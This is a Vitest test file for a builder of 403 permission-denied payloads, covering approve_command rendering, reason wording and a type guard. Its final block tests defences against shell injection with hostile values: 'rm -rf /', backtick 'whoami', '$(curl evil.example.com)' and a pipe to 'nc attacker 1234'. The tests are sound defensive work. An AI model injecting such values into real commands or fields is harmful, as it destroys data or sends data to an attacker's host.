/**
 * Tests for buildPermissionDeniedPayload — Stage A 403 PermissionDenied
 * payload builder (plan milestone p3-stage-a-403-payload of
 * ant-substrate-v0.2-2026-05-29).
 *
 * Covers the spec's T6 acceptance ("approve_command in payload is exactly
 * the CLI invocation that would grant it — string-equal check, no
 * ambiguity") plus reason humanisation, optional-field passthrough, and
 * the runtime type guard.
 */
import { describe, expect, it } from 'vitest';
import {
  buildPermissionDeniedPayload,
  humanizeReason,
  isPermissionDeniedPayload,
  type PermissionDeniedPayload
} from './permissionDeniedPayload';

describe('buildPermissionDeniedPayload', () => {
  it('shapes a minimal room-target payload with default approve_command (T6)', () => {
    const payload = buildPermissionDeniedPayload({
      action: 'chat.post',
      target_kind: 'room',
      target_id: 'orsz2321qb',
      reason: 'no_membership',
      grantee_handle: '@speedyc',
      approvers: [
        { handle: '@jwpk', role: 'room_owner', preferred: true }
      ]
    });
    expect(payload.message).toBe('no membership in this room');
    expect(payload.permission_denied.action).toBe('chat.post');
    expect(payload.permission_denied.target_kind).toBe('room');
    expect(payload.permission_denied.target_id).toBe('orsz2321qb');
    expect(payload.permission_denied.reason).toBe('no_membership');
    expect(payload.permission_denied.approvers).toHaveLength(1);
    expect(payload.permission_denied.approve_command).toBe(
      'ant grant @speedyc chat.post --room orsz2321qb'
    );
    // Optional fields are absent (not undefined-but-present).
    expect(payload.permission_denied).not.toHaveProperty('target_display_name');
    expect(payload.permission_denied).not.toHaveProperty('approve_url');
    expect(payload.permission_denied).not.toHaveProperty('request_id');
    expect(payload.permission_denied).not.toHaveProperty('expires_at_ms');
  });

  it('passes through display name + URL + request id + expiry when supplied', () => {
    const payload = buildPermissionDeniedPayload({
      action: 'chat.post',
      target_kind: 'room',
      target_id: 'orsz2321qb',
      target_display_name: 'speed matters',
      reason: 'no_membership',
      grantee_handle: '@speedyc',
      approvers: [],
      approve_url: 'ant://approve/req_2026-05-29-abc123',
      request_id: 'req_2026-05-29-abc123',
      expires_at_ms: 1_780_090_000_000
    });
    expect(payload.permission_denied.target_display_name).toBe('speed matters');
    expect(payload.permission_denied.approve_url).toBe(
      'ant://approve/req_2026-05-29-abc123'
    );
    expect(payload.permission_denied.request_id).toBe('req_2026-05-29-abc123');
    expect(payload.permission_denied.expires_at_ms).toBe(1_780_090_000_000);
  });

  it('honours an explicit approve_command override (Stage B forward-compat)', () => {
    const payload = buildPermissionDeniedPayload({
      action: 'chat.post',
      target_kind: 'room',
      target_id: 'orsz2321qb',
      reason: 'no_membership',
      grantee_handle: '@speedyc',
      approvers: [],
      approve_command: 'ant grant @speedyc chat.post --room orsz2321qb --once'
    });
    expect(payload.permission_denied.approve_command).toBe(
      'ant grant @speedyc chat.post --room orsz2321qb --once'
    );
  });

  it('emits a flag-less approve_command for system-target grants', () => {
    const payload = buildPermissionDeniedPayload({
      action: 'admin.restart',
      target_kind: 'system',
      target_id: 'fresh-ant',
      reason: 'not_org_admin',
      grantee_handle: '@speedyc',
      approvers: []
    });
    expect(payload.permission_denied.approve_command).toBe(
      'ant grant @speedyc admin.restart'
    );
  });

  it('honours an explicit message override', () => {
    const payload = buildPermissionDeniedPayload({
      action: 'chat.post',
      target_kind: 'room',
      target_id: 'r1',
      reason: 'no_membership',
      grantee_handle: '@x',
      approvers: [],
      message: 'cannot post in #speed-matters'
    });
    expect(payload.message).toBe('cannot post in #speed-matters');
  });
});

describe('humanizeReason', () => {
  it('maps each enum value to a non-empty phrase', () => {
    expect(humanizeReason('no_membership')).toBe('no membership in this room');
    expect(humanizeReason('room_closed')).toBe('room is closed (read-only)');
    expect(humanizeReason('not_room_owner')).toBe('action requires room owner role');
    expect(humanizeReason('not_org_admin')).toBe('action requires org admin role');
    expect(humanizeReason('no_grant')).toBe('action requires an explicit grant');
    expect(humanizeReason('identity_unresolved')).toBe(
      'caller identity could not be resolved'
    );
    expect(humanizeReason('tier_required')).toBe('action requires a premium tier');
    expect(humanizeReason('human_consent_required')).toBe(
      'action requires active human consent'
    );
  });
});

describe('isPermissionDeniedPayload (runtime type guard)', () => {
  it('returns true for a well-formed payload', () => {
    const payload: PermissionDeniedPayload = {
      message: 'no membership',
      permission_denied: {
        action: 'chat.post',
        target_kind: 'room',
        target_id: 'r1',
        reason: 'no_membership',
        approvers: [],
        approve_command: 'ant grant @x chat.post --room r1'
      }
    };
    expect(isPermissionDeniedPayload(payload)).toBe(true);
  });

  it('returns false for null/undefined/non-objects', () => {
    expect(isPermissionDeniedPayload(null)).toBe(false);
    expect(isPermissionDeniedPayload(undefined)).toBe(false);
    expect(isPermissionDeniedPayload('a string')).toBe(false);
    expect(isPermissionDeniedPayload(42)).toBe(false);
  });

  it('returns false when permission_denied block is missing', () => {
    expect(isPermissionDeniedPayload({ message: 'x' })).toBe(false);
  });

  it('returns false when permission_denied is missing required fields', () => {
    expect(
      isPermissionDeniedPayload({
        message: 'x',
        permission_denied: { action: 'chat.post' }
      })
    ).toBe(false);
  });

  it('returns false for the old bare-string 403 body shape', () => {
    expect(
      isPermissionDeniedPayload({
        message: 'Server-resolved identity required.'
      })
    ).toBe(false);
  });
});

describe('approve_command shell safety (security fix 2026-05-29)', () => {
  // The approve_command is intended for copy-paste into a shell. Any
  // value containing shell metacharacters would turn the helpful hint
  // into a command-injection vector against the human owner who runs
  // it. These tests lock the allowlist.

  const SAFE_BASE = {
    action: 'chat.post',
    target_kind: 'room' as const,
    target_id: 'orsz2321qb',
    reason: 'no_membership' as const,
    grantee_handle: '@speedyc',
    approvers: []
  };

  it('renders the safe form when every field passes the charset', () => {
    const payload = buildPermissionDeniedPayload(SAFE_BASE);
    expect(payload.permission_denied.approve_command).toBe(
      'ant grant @speedyc chat.post --room orsz2321qb'
    );
  });

  it('falls back to a generic command when grantee_handle contains shell metacharacters', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      grantee_handle: '@x; rm -rf /'
    });
    expect(payload.permission_denied.approve_command).not.toContain('rm -rf');
    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
  });

  it('falls back when action contains a backtick', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      action: 'chat.post`whoami`'
    });
    expect(payload.permission_denied.approve_command).not.toContain('whoami');
    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
  });

  it('falls back when target_id contains $() command substitution', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      target_id: 'orsz$(curl evil.example.com)'
    });
    expect(payload.permission_denied.approve_command).not.toContain('curl');
    expect(payload.permission_denied.approve_command).not.toContain('$(');
    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
  });

  it('falls back when grantee_handle contains a pipe', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      grantee_handle: '@x | nc attacker 1234'
    });
    expect(payload.permission_denied.approve_command).not.toContain('nc ');
    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
  });

  it('accepts uppercase, digits, dots, hyphens, underscores in handles', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      grantee_handle: '@James.K-Bot_01'
    });
    expect(payload.permission_denied.approve_command).toContain('@James.K-Bot_01');
  });

  it('system-scope skips target_id charset check (no target embed)', () => {
    const payload = buildPermissionDeniedPayload({
      ...SAFE_BASE,
      target_kind: 'system',
      target_id: 'anything-goes;rm$()'
    });
    // System path never embeds target_id, so the dangerous chars in it
    // don't leak into the rendered command. Still safe.
    expect(payload.permission_denied.approve_command).toBe(
      'ant grant @speedyc chat.post'
    );
  });
});
